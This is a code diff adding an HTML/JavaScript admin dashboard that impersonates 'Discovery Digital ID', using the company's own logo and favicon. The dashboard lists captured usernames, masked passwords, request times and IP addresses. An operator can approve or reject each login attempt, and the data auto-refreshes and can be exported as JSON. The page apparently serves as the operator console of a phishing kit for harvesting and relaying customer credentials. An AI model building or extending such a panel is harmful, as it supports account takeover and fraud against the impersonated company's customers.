@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Discovery Digital ID - Admin Panel</title>
+    <link rel="icon" type="image/x-icon" href="https://id.discovery.co.za/dui/current/icons/favicon/discovery/favicon-32x32.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <style>
+        @charset "UTF-8";
+        /*! Bootstrap v4.0.0-alpha.6 */
+        /*! Animate.css - http://daneden.me/animate */
+        /*!------------------------------------ #VISIBILITY HELPER ------------------------------------*/
+        /*!------------------------------------ #DISPLAY HELPER ------------------------------------*/
+        /*!------------------------------------ #POSITION HELPER ------------------------------------*/
+        /*!------------------------------------ #OVERFLOW HELPER ------------------------------------*/
+        /*!------------------------------------ #ALIGN HELPER ------------------------------------*/
+        /*!------------------------------------ #FLOAT HELPER ------------------------------------*/
+        
+        .show{display:block}
+        .hide{visibility:hidden}
+        .hidden{display:none}
+        
+        .inline{display:inline!important}
+        .inline-block{display:inline-block!important}
+        .block{display:block!important}
+        .table{display:table!important}
+        .table-cell{display:table-cell!important}
+        
+        .relative{position:relative!important}
+        .absolute{position:absolute}
+        .fixed{position:fixed}
+        .static{position:static}
+        
+        .pull-right{float:right}
+        
+        /*! CUSTOM STYLES */
+        body {
+            font-family: "Open Sans", sans-serif;
+            font-size: 1em;
+            line-height: 1.875;
+            background-color: #f8f9fa;
+        }
+        
+        .admin-container {
+            margin-top: 60px;
+            margin-bottom: 60px;
+        }
+        
+        .admin-logo {
+            width: 225px;
+            height: 45px;
+            background: url('https://id.discovery.co.za/dui/current/icons/discovery-logo/SVG/logo-color.svg') 0 0/225px 45px no-repeat;
+            display: block;
+        }
+        
+        .admin-header {
+            background-color: #004b8d;
+            color: white;
+            padding: 20px 0;
+            margin-bottom: 30px;
+        }
+        
+        .admin-card {
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            background: white;
+            margin-bottom: 20px;
+        }
+        
+        .admin-card-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            background-color: #f8f9fa;
+            font-weight: 600;
+        }
+        
+        .admin-card-body {
+            padding: 20px;
+        }
+        
+        .user-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .user-table th, .user-table td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .user-table th {
+            background-color: #f8f9fa;
+            font-weight: 600;
+        }
+        
+        .btn {
+            font-weight: 400;
+            line-height: 1.5em;
+            padding: 11px 17px 10px;
+            font-size: .79012345679em;
+            letter-spacing: .1em;
+            border: 2px solid transparent;
+            text-transform: uppercase;
+            transition: all .2s ease-in-out;
+            border-radius: 3px;
+        }
+        
+        .btn-primary {
+            background-color: #004b8d;
+            border-color: #004b8d;
+            color: #fff !important;
+        }
+        
+        .btn-primary:hover {
+            color: #fff;
+            background-color: #00305a;
+            border-color: #002a50;
+        }
+        
+        .btn-outline-primary {
+            color: #004b8d !important;
+            background-image: none;
+            background-color: transparent;
+            border-color: #004b8d;
+        }
+        
+        .btn-outline-primary:hover {
+            color: #fff !important;
+            background-color: #004b8d;
+            border-color: #004b8d;
+        }
+        
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+        
+        .small, small {
+            font-size: .888888888889em;
+            line-height: 1.875;
+            font-weight: 400;
+        }
+        
+        a {
+            color: #1e72c3;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            color: #144b81;
+            text-decoration: underline;
+        }
+        
+        .d-flex {
+            display: -webkit-flex !important;
+            display: -ms-flexbox !important;
+            display: flex !important;
+        }
+        
+        .justify-content-center {
+            -webkit-justify-content: center !important;
+            -ms-flex-pack: center !important;
+            justify-content: center !important;
+        }
+        
+        .align-items-center {
+            -webkit-align-items: center !important;
+            -ms-flex-align: center !important;
+            align-items: center !important;
+        }
+        
+        .mb-1 {
+            margin-bottom: 15px !important;
+        }
+        
+        .ml-auto {
+            margin-left: auto !important;
+        }
+        
+        .text-center {
+            text-align: center !important;
+        }
+        
+        .text-right {
+            text-align: right !important;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 0.25em 0.4em;
+            font-size: 75%;
+            font-weight: 700;
+            line-height: 1;
+            text-align: center;
+            white-space: nowrap;
+            vertical-align: baseline;
+            border-radius: 0.25rem;
+        }
+        
+        .badge-success {
+            color: #fff;
+            background-color: #28a745;
+        }
+        
+        .badge-warning {
+            color: #212529;
+            background-color: #ffc107;
+        }
+        
+        .badge-danger {
+            color: #fff;
+            background-color: #dc3545;
+        }
+        
+        .nav-tabs {
+            border-bottom: 1px solid #dee2e6;
+            margin-bottom: 20px;
+        }
+        
+        .nav-tabs .nav-item {
+            margin-bottom: -1px;
+        }
+        
+        .nav-tabs .nav-link {
+            border: 1px solid transparent;
+            border-top-left-radius: 0.25rem;
+            border-top-right-radius: 0.25rem;
+        }
+        
+        .nav-tabs .nav-link.active {
+            color: #495057;
+            background-color: #fff;
+            border-color: #dee2e6 #dee2e6 #fff;
+        }
+        
+        .stat-card {
+            text-align: center;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .stat-label {
+            color: #6c757d;
+        }
+        
+        @media (max-width: 767px) {
+            .admin-container {
+                margin-top: 30px;
+                margin-bottom: 30px;
+            }
+            
+            .admin-logo {
+                width: 150px;
+                height: 30px;
+                background-size: 150px 30px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-header">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <a class="admin-logo" href="/"></a>
+                <h4 class="mb-0">Admin Dashboard</h4>
+                <div>
+                    <span class="badge badge-success">Online</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container admin-container">
+        <div class="row">
+            <div class="col-12">
+                <div class="d-flex justify-content-between align-items-center mb-4">
+                    <h4>Admin Dashboard - Login Requests</h4>
+                    <button class="btn btn-primary" id="refreshData">Refresh Data</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="row mb-4">
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number" id="totalUsers">0</div>
+                    <div class="stat-label">Total Requests</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number" id="activeUsers">0</div>
+                    <div class="stat-label">Approved</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number" id="newUsers">0</div>
+                    <div class="stat-label">Pending</div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-number" id="pendingUsers">0</div>
+                    <div class="stat-label">Rejected</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-12">
+                <div class="admin-card">
+                    <div class="admin-card-header">
+                        <div class="d-flex justify-content-between align-items-center">
+                            <span>Pending Login Requests</span>
+                            <div>
+                                <button class="btn btn-sm btn-outline-primary mr-2" id="exportData">Export</button>
+                                <button class="btn btn-sm btn-outline-primary" id="clearData">Clear Data</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="admin-card-body">
+                        <table class="user-table">
+                            <thead>
+                                <tr>
+                                    <th>Username</th>
+                                    <th>Password</th>
+                                    <th>Request Time</th>
+                                    <th>IP Address</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="loginRequestsTable">
+                                <!-- Data will be populated by JavaScript -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-12">
+                <div class="admin-card">
+                    <div class="admin-card-header">
+                        <span>Processed Requests</span>
+                    </div>
+                    <div class="admin-card-body">
+                        <table class="user-table">
+                            <thead>
+                                <tr>
+                                    <th>Username</th>
+                                    <th>Request Time</th>
+                                    <th>Status</th>
+                                    <th>IP Address</th>
+                                </tr>
+                            </thead>
+                            <tbody id="processedRequestsTable">
+                                <!-- Data will be populated by JavaScript -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Load and display data
+            loadData();
+            
+            // Set up auto-refresh every 3 seconds
+            setInterval(loadData, 3000);
+            
+            // Manual refresh button
+            $('#refreshData').click(loadData);
+            
+            // Clear data button
+            $('#clearData').click(function() {
+                if (confirm('Are you sure you want to clear all login data?')) {
+                    // Clear all login requests and responses
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key.startsWith('loginRequest_') || key.startsWith('loginResponse_')) {
+                            localStorage.removeItem(key);
+                        }
+                    }
+                    loadData();
+                }
+            });
+            
+            // Export data button
+            $('#exportData').click(function() {
+                const exportData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key.startsWith('loginRequest_') || key.startsWith('loginResponse_')) {
+                        exportData[key] = localStorage.getItem(key);
+                    }
+                }
+                const dataStr = JSON.stringify(exportData, null, 2);
+                const dataBlob = new Blob([dataStr], {type: 'application/json'});
+                const url = URL.createObjectURL(dataBlob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'login-requests-data.json';
+                link.click();
+            });
+        });
+        
+        function loadData() {
+            // Get all login requests from localStorage
+            const pendingRequests = [];
+            const processedRequests = [];
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith('loginRequest_')) {
+                    try {
+                        const requestData = JSON.parse(localStorage.getItem(key));
+                        if (requestData.status === 'pending') {
+                            pendingRequests.push(requestData);
+                        } else {
+                            processedRequests.push(requestData);
+                        }
+                    } catch (e) {
+                        console.error("Error parsing request data:", e);
+                    }
+                } else if (key.startsWith('loginResponse_')) {
+                    try {
+                        const responseData = JSON.parse(localStorage.getItem(key));
+                        processedRequests.push(responseData);
+                    } catch (e) {
+                        console.error("Error parsing response data:", e);
+                    }
+                }
+            }
+            
+            // Sort by timestamp (newest first)
+            pendingRequests.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            processedRequests.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            // Update statistics
+            updateStatistics(pendingRequests, processedRequests);
+            
+            // Populate tables
+            populatePendingRequests(pendingRequests);
+            populateProcessedRequests(processedRequests);
+        }
+        
+        function updateStatistics(pendingRequests, processedRequests) {
+            const totalRequests = pendingRequests.length + processedRequests.length;
+            const approvedRequests = processedRequests.filter(data => data.status === 'approved').length;
+            const pendingCount = pendingRequests.length;
+            const rejectedRequests = processedRequests.filter(data => data.status === 'rejected').length;
+            
+            $('#totalUsers').text(totalRequests);
+            $('#activeUsers').text(approvedRequests);
+            $('#newUsers').text(pendingCount);
+            $('#pendingUsers').text(rejectedRequests);
+        }
+        
+        function populatePendingRequests(requests) {
+            const tableBody = $('#loginRequestsTable');
+            tableBody.empty();
+            
+            if (requests.length === 0) {
+                tableBody.append(`
+                    <tr>
+                        <td colspan="5" class="text-center">No pending login requests</td>
+                    </tr>
+                `);
+                return;
+            }
+            
+            requests.forEach(request => {
+                const row = `
+                    <tr id="request-${request.id}">
+                        <td>${request.username || 'N/A'}</td>
+                        <td>${request.password ? '•'.repeat(request.password.length) : 'N/A'}</td>
+                        <td>${new Date(request.timestamp).toLocaleString()}</td>
+                        <td>${request.ip || '127.0.0.1'}</td>
+                        <td>
+                            <button class="btn btn-sm btn-success mr-2 approve-btn" data-id="${request.id}">Approve</button>
+                            <button class="btn btn-sm btn-danger reject-btn" data-id="${request.id}">Reject</button>
+                        </td>
+                    </tr>
+                `;
+                tableBody.append(row);
+            });
+            
+            // Attach event handlers to approve/reject buttons
+            $('.approve-btn').click(function() {
+                const requestId = $(this).data('id');
+                approveRequest(requestId);
+            });
+            
+            $('.reject-btn').click(function() {
+                const requestId = $(this).data('id');
+                rejectRequest(requestId);
+            });
+        }
+        
+        function populateProcessedRequests(requests) {
+            const tableBody = $('#processedRequestsTable');
+            tableBody.empty();
+            
+            if (requests.length === 0) {
+                tableBody.append(`
+                    <tr>
+                        <td colspan="4" class="text-center">No processed requests</td>
+                    </tr>
+                `);
+                return;
+            }
+            
+            // Show only the most recent 20 processed requests
+            const recentRequests = requests.slice(0, 20);
+            
+            recentRequests.forEach(request => {
+                const statusBadge = request.status === 'approved' ? 
+                    '<span class="badge badge-success">Approved</span>' : 
+                    '<span class="badge badge-danger">Rejected</span>';
+                
+                const row = `
+                    <tr>
+                        <td>${request.username || 'N/A'}</td>
+                        <td>${new Date(request.timestamp).toLocaleString()}</td>
+                        <td>${statusBadge}</td>
+                        <td>${request.ip || '127.0.0.1'}</td>
+                    </tr>
+                `;
+                tableBody.append(row);
+            });
+        }
+        
+        function approveRequest(requestId) {
+            // Get the request data
+            const requestData = JSON.parse(localStorage.getItem('loginRequest_' + requestId));
+            if (requestData) {
+                // Update request status
+                requestData.status = 'approved';
+                requestData.processedAt = new Date().toISOString();
+                
+                // Save response
+                const response = {
+                    id: requestId,
+                    username: requestData.username,
+                    timestamp: requestData.processedAt,
+                    status: 'approved',
+                    ip: requestData.ip
+                };
+                
+                localStorage.setItem('loginResponse_' + requestId, JSON.stringify(response));
+                
+                // Remove from pending requests table
+                $('#request-' + requestId).remove();
+                
+                // Reload data
+                loadData();
+            }
+        }
+        
+        function rejectRequest(requestId) {
+            // Get the request data
+            const requestData = JSON.parse(localStorage.getItem('loginRequest_' + requestId));
+            if (requestData) {
+                // Update request status
+                requestData.status = 'rejected';
+                requestData.processedAt = new Date().toISOString();
+                
+                // Save response
+                const response = {
+                    id: requestId,
+                    username: requestData.username,
+                    timestamp: requestData.processedAt,
+                    status: 'rejected',
+                    ip: requestData.ip
+                };
+                
+                localStorage.setItem('loginResponse_' + requestId, JSON.stringify(response));
+                
+                // Remove from pending requests table
+                $('#request-' + requestId).remove();
+                
+                // Reload data
+                loadData();
+            }
+        }
+    </script>
+</body>
+</html>
